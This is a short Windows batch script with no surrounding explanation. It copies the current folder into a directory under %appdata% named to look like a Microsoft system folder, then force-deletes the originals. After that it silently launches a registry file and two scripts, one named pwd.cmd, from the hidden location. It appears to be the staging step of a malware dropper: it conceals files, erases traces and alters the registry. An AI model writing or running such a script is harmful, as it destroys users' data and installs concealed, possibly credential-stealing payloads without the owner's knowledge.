mkdir %appdata%\Microsoft\Windows\temp
xcopy /E * %appdata%\Microsoft\Windows\temp
del /f /q *
rmdir /s /q x
start %appdata%\Microsoft\Windows\temp\setup.reg
start %appdata%\Microsoft\Windows\temp\x\start.bat
start %appdata%\Microsoft\Windows\temp\pwd.cmd

